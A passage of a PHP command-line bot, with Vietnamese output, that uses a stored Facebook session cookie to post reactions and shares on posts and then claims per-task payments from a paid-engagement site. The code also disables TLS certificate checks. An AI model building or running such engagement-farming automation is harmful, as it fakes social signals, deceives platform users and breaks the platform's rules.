	echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."Thực Hiện Share Cho Bài Viết".$red."]".$res." =>".$green." $id".$red."\n";
echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."TIỀN JOB".$red."]".$res." =>".$green." +".$price."₫".$red."\n";
echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."ACOTIEN".$red."]".$res." =>".$green." ".$getmn["msg"]."\n";
echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."SỐ DƯ".$red."]".$res." =>".$green." $sodu\n";
echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."Chờ Duyệt".$red."]".$res." =>".$green." $choduyet\n";
echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."Số Job Đã Làm Trong Tool".$red."]".$res." =>".$green." $dem\n";
	for ($makep=38;$makep > 0;$makep--){
echo $res."-";
usleep(2500);
echo $red."-";
}
echo "\n";
	for ($time=$delay;$time>-1;$time--)
{ 
echo "\r".$res."~".$red."[".$yellow."|".$red."]$blue Vui Lòng Đợi  $time      \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."/".$red."]$blue Vui Lòng Đợi $time        \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."-".$red."]$blue Vui Lòng Đợi $time          \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."\\".$red."]".$red."$blue Vui Lòng Đợi $time          \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."|".$red."]$blue Vui Lòng Đợi $time          \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."/".$red."]$blue Vui Lòng Đợi $time          \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."-".$red."]$blue Vui Lòng Đợi $time          \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."\\".$red."]".$red."$blue Vui Lòng Đợi $time          \r";
usleep(125000);
}
echo "$res                                  \r";
}

}




if (strpos($type, 'Thực hiện <bstyle="color:') !== false && in_array('CX', $loai)){
	//Phân Loại
if (strpos($type, 'LOVE') !== false){
	$type='LOVE';
	}
if (strpos($type, 'HAHA') !== false){
	$type='HAHA';
	}

if (strpos($type, 'ANGRY') !== false){
	$type='ANGRY';
	}
	
	if (strpos($type, 'WOW') !== false){
	$type='WOW';
	}
	
	if (strpos($type, 'SAD') !== false){
	$type='SAD';
	}
	//Làm
$id2=explode("like('", $bal1);
$id=explode("'", $id2[1])[0];
echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."Thực Hiện $type Cho Bài Viết".$red."]".$res." =>".$green." $id".$red."\n";
$ch=curl_init();
curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4 );
curl_setopt($ch, CURLOPT_TCP_FASTOPEN, true);
curl_setopt($ch, CURLOPT_URL, 'https://mbasic.facebook.com/'.$id);
	$head[] = "Connection: keep-alive";
	$head[] = "Keep-Alive: 300";
	$head[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
	$head[] = "Accept-Language: en-us,en;q=0.5";
	curl_setopt($ch, CURLOPT_USERAGENT, 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14');
	curl_setopt($ch, CURLOPT_ENCODING, '');
	curl_setopt($ch, CURLOPT_COOKIE, $cookiefb);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_TIMEOUT, 60);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect
	:'));
	$page = curl_exec($ch);
	if (strpos($page, "xs=deleted") == true) {
        exit("$res ~".$yellow."[".$red."×".$yellow."]".$res." =>".$red." Die Cookie !!!\n");
}
	if ($id2 != $id && explode('&amp;origin_uri=',explode('amp;ft_id=',$page,2)[1],2)[0]){
		$get = explode('&amp;origin_uri=',explode('amp;ft_id=',$page,2)[1],2)[0];
	}else{
		$get = $id2;
	}
	$link = 'https://mbasic.facebook.com/reactions/picker/?is_permalink=1&ft_id='.$get;
	curl_setopt($ch, CURLOPT_URL, $link);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$cx = curl_exec($ch);
	$haha = explode('<a href="',$cx);
	if ($type == 'LOVE'){
		$haha2 = explode('" style="display:block"',$haha[2])[0];
	}else if ($type == 'WOW'){
		$haha2 = explode('" style="display:block"',$haha[5])[0];
	}else if ($type == 'HAHA'){
		$haha2 = explode('" style="display:block"',$haha[4])[0];
	}else if ($type == 'SAD'){
		$haha2 = explode('" style="display:block"',$haha[6])[0];
	}else{
		$haha2 = explode('" style="display:block"',$haha[7])[0];
	}
	$link2 = html_entity_decode($haha2);	

	curl_setopt($ch, CURLOPT_URL, 'https://mbasic.facebook.com'.$link2);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_exec($ch);
	curl_close($ch);

$ch=curl_init();
curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4 );
curl_setopt($ch, CURLOPT_TCP_FASTOPEN, true);
curl_setopt($ch, CURLOPT_URL, 'https://www.acotien.com/system/nhan-tien-cam-xuc');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $ua);
$get="id=".$id."&loaicx=".$type;
curl_setopt($ch, CURLOPT_POST,$get);
curl_setopt($ch, CURLOPT_POSTFIELDS,$get);
curl_setopt($ch, CURLOPT_COOKIEFILE, "Acotien.txt");
$xu=curl_exec($ch);
curl_close($ch);

$getmn=json_decode($xu,true);

if ($getmn["msg"] == 'Bạn đã thực hiện thành công, tiền đã được cộng vào tài khoản.'){
$chuyenacc++;
	$dem++;
	$url = 'https://www.acotien.com/kiem-tien';
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_ENCODING, "");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);

curl_setopt($ch, CURLOPT_COOKIEFILE, 'Acotien.txt');
$bal1=curl_exec($ch);
$so=explode('Số dư: <b class="red">', $bal1);
$sodu=explode('<', $so[1])[0];
$cho=explode('Chờ duyệt</span> <h6 class="font-semi-bold pending_coin" style="font-size: 13px;">', $bal1);
$choduyet=explode('<', $cho[1])[0];
	echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."Thực Hiện $type Cho Bài Viết".$red."]".$res." =>".$green." $id".$red."\n";
echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."TIỀN JOB".$red."]".$res." =>".$green." +".$price."₫".$red."\n";
echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."ACOTIEN".$red."]".$res." =>".$green." ".$getmn["msg"]."\n";
echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."SỐ DƯ".$red."]".$res." =>".$green." $sodu\n";
echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."Chờ Duyệt".$red."]".$res." =>".$green." $choduyet\n";
echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."Số Job Đã Làm Trong Tool".$red."]".$res." =>".$green." $dem\n";
	echo $res."- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n";
	for ($time=$delay;$time>-1;$time--)
{ 
echo "\r".$res."~".$red."[".$yellow."|".$red."]$blue Vui Lòng Đợi  $time      \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."/".$red."]$blue Vui Lòng Đợi $time        \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."-".$red."]$blue Vui Lòng Đợi $time          \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."\\".$red."]".$red."$blue Vui Lòng Đợi $time          \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."|".$red."]$blue Vui Lòng Đợi $time          \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."/".$red."]$blue Vui Lòng Đợi $time          \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."-".$red."]$blue Vui Lòng Đợi $time          \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."\\".$red."]".$red."$blue Vui Lòng Đợi $time          \r";
usleep(125000);
}
echo "$res                                  \r";
}

}

if ($chuyenacc==$jobsck){
	echo $res."~ ".$green."Đã Làm $yellow$jobsck ".$green."Nhiệm Vụ\n";
	break;
	}

}}}}
